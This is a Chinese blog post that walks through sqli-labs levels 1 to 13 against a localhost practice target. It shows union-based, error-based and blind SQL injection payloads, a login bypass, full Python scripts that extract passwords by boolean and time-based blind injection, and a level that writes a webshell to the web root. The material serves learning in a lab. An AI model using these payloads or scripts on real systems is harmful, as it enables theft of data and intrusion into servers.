

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
  <link rel="icon" type="image/png" href="/img/feiji.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="sunzy">
  <meta name="keywords" content="">
  <title>net_a_and_d - 一路走到黑</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-03-03 15:09" pubdate>
        2021年3月3日 下午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      21.7k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      317
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">net_a_and_d</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：1 年前
                
              </p>
            
            <div class="markdown-body" id="post-body">
              <p>[TOC]</p>
<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>get提交参数id</p>
<p>首先提交<code>1&#39;</code>，判断是字符型还是数字型注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130223925654.png" srcset="/img/loading.gif" alt="image-20210130223925654"></p>
<p>这里出现报错，说明是字符类型的，并且是用<code>&#39;</code>将参数id包裹起来的。</p>
<p>接下来就是判断列数，爆表名，爆列名和数据库内容</p>
<p><strong>0x1 确定列数并爆出表名</strong></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130213104147.png" srcset="/img/loading.gif" alt="image-20210130213104147"></p>
<p>当列数增加到4的时候开始报错，说明是三列</p>
<div class="hljs"><pre><code class="hljs q">?id=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()--+</code></pre></div>

<p><img src="https://i.loli.net/2021/01/30/KtISlB9Wd4mreqF.png" srcset="/img/loading.gif" alt="image-20210130213358017.png"></p>
<p><strong>0x2 爆列名</strong></p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+</code></pre></div>

<p>这里的列名很多</p>
<div class="hljs"><pre><code class="hljs pgsql">user_id,first_name,last_name,<span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span>,avatar,last_login,failed_login</code></pre></div>

<p><strong>0x3 爆出内容</strong></p>
<p>选择password</p>
<div class="hljs"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+ </span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130213751401.png" srcset="/img/loading.gif" alt="image-20210130213751401"></p>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>同样使用 <code>id=1&#39;</code>，判断是什么类型的注入</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130214135139.png" srcset="/img/loading.gif" alt="image-20210130214135139"></p>
<p>可以发现输入的<code>&#39;</code>没有其他的<code>&#39;</code>与之闭合，导致报错，所以这是数字型注入</p>
<p>所以可以直接使用level1的注入语句，只需要删除 ‘ 即可</p>
<div class="hljs"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+ </span>

?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+ </span>

?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">password</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+ </span></code></pre></div>

<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>提交<code>id=1&#39;</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130214628110.png" srcset="/img/loading.gif" alt="image-20210130214628110"></p>
<p>分析一下报错原因</p>
<p>出错的语句为</p>
<div class="hljs"><pre><code class="hljs 1c">&#x27;1&#x27;&#x27;) LIMIT 0,1</code></pre></div>

<p>其中<strong style="color:orange;">1’</strong>输入的内容，所以包裹参数的格式为<code>(&#39;id&#39;)</code></p>
<p>注入语句可以直接在level1的基础上增加一个 )即可</p>
<p>将原语句修改为</p>
<div class="hljs"><pre><code class="hljs ada"><span class="hljs-string">&#x27;1&#x27;</span>) 注入语句 <span class="hljs-comment">--+ &#x27;) LIMIT 0,1 </span></code></pre></div>

<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()--+ 

?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+ 

?<span class="hljs-attribute">id</span>=-1&#x27;) union select 1,group_concat(password),3 <span class="hljs-keyword">from</span> users--+</code></pre></div>

<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>同样输入<code>id=1&#39;</code>，但是这次没有报错，才是是使用了<code>&quot;</code>，换成<code>id=1&quot;</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130215456338.png" srcset="/img/loading.gif" alt="image-20210130215456338"></p>
<p>很明显和level3基本相同，将<code>&#39;</code>改为<code>&quot;</code>，就是这关的答案</p>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>这题是字符型注入，但是不在回显所查询的内容，所以是盲注</p>
<p>查看源码也可以发现</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130220440238.png" srcset="/img/loading.gif" alt="image-20210130220440238" style="zoom:50%;">

<p>不在打印出所查询到的内容，所以是盲注，但是这关没有关闭报错回显，所以可以通过报错注入</p>
<p><strong>报错注入</strong></p>
<p><span style="background-color:yellow"><strong>(1). 通过floor报错</strong></span></p>
<p>and (select 1 from (select count(<em>),concat((payload) from users limit 0,1),floor (rand(0)</em>2))x from information_schema.tables group by x)a)</p>
<p>其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符</p>
<p><span style="background-color:yellow"><strong>(2). 通过updatexml报错</strong></span></p>
<p>and updatexml(1,payload,1)</p>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
<p><span style="background-color:yellow"><strong>(3). 通过ExtractValue报错</strong></span></p>
<p>and extractvalue(1, payload)</p>
<p>输出字符有长度限制，最长32位。</p>
<p><strong>0x1 确定数据库名</strong></p>
<div class="hljs"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x23</span>,database(),<span class="hljs-number">0x23</span>))<span class="hljs-comment">--+</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130221306917.png" srcset="/img/loading.gif" alt="image-20210130221306917"></p>
<p><strong>0x2 爆表名</strong></p>
<div class="hljs"><pre><code class="hljs n1ql">?id=1&#x27; and extractvalue(1,concat(0x23,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x23</span>))--+</code></pre></div>

<p>这里每次报错显示的信息只有一行，所以只能有 limit，一个一个的显示，直到找到目标表名</p>
<p><strong>0x3 爆列名</strong></p>
<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> extractvalue(1,concat(0x23,(select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> limit 1,1),0x23))--+</code></pre></div>

<p><strong>0x4 爆内容</strong></p>
<div class="hljs"><pre><code class="hljs mysql">?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+</code></pre></div>

<p>后面的内容可以通过改变limit后的第一个参数查看</p>
<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>与level5很像</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210130223612822.png" srcset="/img/loading.gif" alt="image-20210130223612822"></p>
<p>但是这里是用 “包裹参数，所以只需要将上面的注入语句中的 ‘ 改为 “即可</p>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>提交id=1，出现提示</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131230645205.png" srcset="/img/loading.gif" alt="image-20210131230645205"></p>
<p>需要使用outfile函数</p>
<p>在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个</p>
<ul>
<li>into dumpfile()</li>
<li>into outfile()</li>
<li>load_file()</li>
</ul>
<p>这里我们利用outfile函数</p>
<p>首先确定这关包裹参数的格式</p>
<p>一直测试到<code>id=1&#39;)) --+</code>，才显示正确所以可以确定参数的包裹格式为<code>((&#39;id&#39;))</code></p>
<p><strong>0x1 向网站根目录写入一句话木马</strong></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233508732.png" srcset="/img/loading.gif" alt="image-20210131233508732"></p>
<p>执行后就可以在根目录中看到这个文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233433411.png" srcset="/img/loading.gif" alt="image-20210131233433411"></p>
<p><strong>0x2 使用蚁剑连接</strong></p>
<div class="hljs"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>/<span class="hljs-number">3</span>.php
密码:cmd</code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210131233415258.png" srcset="/img/loading.gif" alt="image-20210131233415258" style="zoom:50%;">

<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>根据标题和测试结果可以看出是盲注</p>
<p>首先判断是什么类型注入</p>
<p>提交<code>id=1</code>，显示结果为<code>You are in</code>，可以确定成功查询返回的结果</p>
<p>提交<code>id=1&#39;</code>，没有提示<code>You are in</code>，但是提交<code>id=1&#39; --+</code>，再次出现<code>You are in</code>，可以确定是字符型注入，包裹形式为<code>&#39;id&#39;</code></p>
<p>接下来就是确定盲注使用的语句，这里可以使用 <code>ascii</code>和<code>substring</code>两个函数</p>
<p><strong>0x1 爆出数据库名</strong></p>
<div class="hljs"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27; and ascii(substring(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span><span class="hljs-comment">%23</span></code></pre></div>

<p>首先假设数据库名的第一个字母的ascii码值大于97，回显为<code>you are in</code>，所以确定第一个字母大于97，之后可以使用二分法确定出最后的字母。</p>
<p>可以使用脚本完成该过程，脚本跑出的结果为  <strong style="color:red;">security</strong></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201120357770.png" srcset="/img/loading.gif" alt="image-20210201120357770"></p>
<p><strong>0x2 爆出表名</strong></p>
<p>使用注入语句</p>
<div class="hljs"><pre><code class="hljs n1ql">id=1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre></div>

<p>最后爆出的表名如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201121435085.png" srcset="/img/loading.gif" alt></p>
<p><strong>0x3 爆出列名</strong></p>
<div class="hljs"><pre><code class="hljs n1ql">id=1&#x27; and (<span class="hljs-keyword">select</span> ascii(substring(group_concat(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201140521465.png" srcset="/img/loading.gif" alt="image-20210201140521465"></p>
<p><strong>0x4 爆出内容</strong></p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and (select ascii(substring(group_concat(password),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) as a from users having a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201141626668.png" srcset="/img/loading.gif" alt="image-20210201141626668"></p>
<p>完整脚本如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>
t = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)

        response = requests.get(url+payload)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    <span class="hljs-comment"># print(mid)</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)
print(flag)</code></pre></div>

<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>题目标题提示了是基于时间且单引号闭合的盲注</p>
<p>基于时间的盲注需要使用到<code>sleep</code>函数，基本用法如下</p>
<p>分别提交<code>id=1</code>，<code>id=1&#39; and sleep(3) --+</code>，其服务器的响应时间如下，第二个的响应时间正好比第一个长了三秒，所以可以根据服务器的响应时间来判断自己所查询的语句是否正确，一般需要编写脚本完成所有步骤。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201213644564.png" srcset="/img/loading.gif" alt="image-20210201213644564"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201213715695.png" srcset="/img/loading.gif" alt="image-20210201213715695"></p>
<p>注入脚本只需要改一改level8的即可。</p>
<p>完整脚本如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        t1 = datetime.datetime.now()
        response = requests.get(url+payload)
        t2 = datetime.datetime.now()
        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">2</span> :
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>

    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)
print(flag)</code></pre></div>



<p>爆破数据库名的过程如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210201220840369.png" srcset="/img/loading.gif" alt="image-20210201220840369"></p>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>与level9基本相同，只需要将payload中的<code>&#39;</code>换成<code>&quot;</code>即可</p>
<p>完整脚本如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1&quot; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>((select <span class="hljs-built_in">ascii</span>(substring(group_concat(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables where table_schema=database() having a&gt;&#123;<span class="hljs-number">1</span>&#125;),sleep(<span class="hljs-number">2</span>),null)%<span class="hljs-number">23</span><span class="hljs-string">&quot;.format(i,mid)</span>
<span class="hljs-string">        # payload = &quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        <span class="hljs-comment"># payload = &quot;1&quot; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid)</span>
        t1 = datetime.datetime.now()
        response = requests.get(url+payload)
        t2 = datetime.datetime.now()
        <span class="hljs-keyword">if</span> (t2 - t1).seconds &gt; <span class="hljs-number">2</span> :
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>

    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    print(flag)
print(flag)</code></pre></div>

<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>打开网页是一个登录页面</p>
<p>先判断列数，当三列出现报错，说明只有两列</p>
<div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-attr">uname=</span>admin&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span><span class="hljs-comment">#&amp;passwd=1&amp;submit=Submit</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421192950662.png" srcset="/img/loading.gif" alt="image-20210421192950662"></p>
<p>尝试使用万能密码，成功登录</p>
<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&#x27; <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> #&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421192757146.png" srcset="/img/loading.gif" alt="image-20210421192757146" style="zoom:50%;">

<p>获取数据库</p>
<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&#x27; union select 1,(SELECT GROUP_CONCAT(schema_name) <span class="hljs-keyword">FROM</span> information_schema.schemata)##&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421193129915.png" srcset="/img/loading.gif" alt="image-20210421193129915"></p>
<p>获取列名，字段名</p>
<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&#x27; union select 1,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#&amp;passwd=1&amp;submit=Submit


<span class="hljs-attribute">uname</span>=sda&#x27; union select 1,group_concat(password) <span class="hljs-keyword">from</span> users#&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre></div>

<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>这一关与上面就是使用的闭合符号不同，使用的双引号，所以只要将上面的payload改一下即可</p>
<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=sda&quot; union select 1,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#&amp;passwd=1&amp;submit=Submit


<span class="hljs-attribute">uname</span>=sda&quot; union select 1,group_concat(password) <span class="hljs-keyword">from</span> users#&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit</code></pre></div>

<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>输入单引号，出现报错</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421193947944.png" srcset="/img/loading.gif" alt="image-20210421193947944"></p>
<p>分析一下即可</p>
<p><code>&#39;&#39;&#39;) and password=(&#39;&#39;) LIMIT 0,1</code></p>
<p>第二个<code>&#39;</code>是我们输入的，所以闭合方式为<code>&#39;)</code></p>
